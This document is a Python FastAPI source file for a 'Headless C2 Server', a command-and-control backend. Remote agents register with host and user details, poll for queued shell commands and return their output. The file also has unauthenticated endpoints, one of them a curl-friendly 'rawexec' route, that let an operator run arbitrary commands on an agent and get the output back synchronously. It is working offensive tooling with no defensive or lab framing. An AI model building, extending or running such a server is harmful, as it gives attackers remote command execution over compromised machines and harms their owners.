import os
import asyncio
from contextlib import asynccontextmanager
from typing import Optional, Dict, Any
from fastapi import FastAPI, HTTPException, Request, Response, Query
from pydantic import BaseModel
from server import db

@asynccontextmanager
async def lifespan(app: FastAPI):
    db.init_db()
    yield

app = FastAPI(title="Headless C2 Server", lifespan=lifespan)

class AgentCheckinReq(BaseModel):
    agent_id: str
    hostname: Optional[str] = "unknown"
    ip_address: Optional[str] = "127.0.0.1"
    os_name: Optional[str] = "unknown"
    username: Optional[str] = "unknown"
    arch: Optional[str] = ""

class TaskResultReq(BaseModel):
    agent_id: str
    task_id: str
    status: str
    exit_code: int = 0
    stdout: str = ""
    stderr: str = ""
    error_message: Optional[str] = None

class QueueTaskReq(BaseModel):
    agent_id: str
    command: str

class SyncExecReq(BaseModel):
    agent_id: str
    command: str
    timeout: int = 30

@app.post("/api/agent/register")
async def register(req: AgentCheckinReq, request: Request):
    ip = request.client.host if request.client else req.ip_address
    agent = db.upsert_agent({**req.model_dump(), "ip_address": ip})
    return {"status": "registered", "agent": agent, "config": {"checkin_interval": db.DEFAULT_CHECKIN_INTERVAL}}

@app.post("/api/agent/checkin")
async def checkin(req: AgentCheckinReq, request: Request):
    ip = request.client.host if request.client else req.ip_address
    db.upsert_agent({**req.model_dump(), "ip_address": ip})
    tasks = db.fetch_and_dispatch_pending_tasks(req.agent_id)
    return {"status": "ok", "tasks": tasks, "checkin_interval": db.DEFAULT_CHECKIN_INTERVAL}

@app.post("/api/agent/result")
async def submit_result(req: TaskResultReq):
    res = db.record_task_result(req.task_id, req.agent_id, req.status, req.exit_code, req.stdout, req.stderr, req.error_message)
    if not res:
        raise HTTPException(status_code=404, detail="Task not found")
    return {"status": "recorded", "task": res}

@app.get("/api/agents")
async def list_agents():
    return db.get_agents()

@app.get("/api/agents/{agent_id}")
async def get_agent(agent_id: str):
    a = db.get_agent(agent_id)
    if not a:
        raise HTTPException(status_code=404, detail="Agent not found")
    return a

@app.post("/api/tasks")
async def queue_task(req: QueueTaskReq):
    tasks = db.queue_task(req.agent_id, req.command)
    return {"status": "queued", "count": len(tasks), "tasks": tasks}

@app.get("/api/tasks")
async def list_tasks(agent_id: Optional[str] = None, status: Optional[str] = None):
    return db.get_tasks(agent_id=agent_id, status=status)

@app.get("/api/tasks/{task_id}")
async def get_task(task_id: str):
    t = db.get_task(task_id)
    if not t:
        raise HTTPException(status_code=404, detail="Task not found")
    return t

@app.post("/api/tasks/{task_id}/cancel")
async def cancel_task(task_id: str):
    success = db.cancel_task(task_id)
    if not success:
        raise HTTPException(status_code=400, detail="Cannot cancel task")
    return {"status": "cancelled", "task_id": task_id}

# ---------------------------------------------------------
# Synchronous Terminal & cURL Execution Endpoints
# ---------------------------------------------------------

@app.post("/api/exec", summary="Queue command & wait synchronously for execution result")
async def sync_exec(req: SyncExecReq):
    tasks = db.queue_task(req.agent_id, req.command)
    if not tasks:
        raise HTTPException(status_code=400, detail="Failed to queue task")

    task_id = tasks[0]["id"]
    for _ in range(req.timeout):
        await asyncio.sleep(1)
        t = db.get_task(task_id)
        if t and t.get("status") in ("completed", "failed"):
            return t

    return {"status": "timeout", "task_id": task_id, "message": f"Task queued, but agent did not return output within {req.timeout}s"}


@app.post("/api/rawexec/{agent_id}", summary="cURL terminal endpoint - returns raw stdout string")
async def raw_exec(agent_id: str, request: Request, cmd: Optional[str] = Query(None), timeout: int = 30):
    body = await request.body()
    command_str = cmd or body.decode("utf-8").strip()

    if not command_str:
        raise HTTPException(status_code=400, detail="No command provided in request body or ?cmd= query param")

    tasks = db.queue_task(agent_id, command_str)
    if not tasks:
        raise HTTPException(status_code=400, detail="Failed to queue task")

    task_id = tasks[0]["id"]
    for _ in range(timeout):
        await asyncio.sleep(1)
        t = db.get_task(task_id)
        if t and t.get("status") in ("completed", "failed"):
            output = t.get("stdout") or t.get("stderr") or t.get("error_message") or ""
            return Response(content=output, media_type="text/plain")

    return Response(content=f"[!] Timeout waiting for agent {agent_id} after {timeout}s\n", media_type="text/plain", status_code=504)


@app.get("/api/stats")
async def stats():
    return db.get_system_stats()
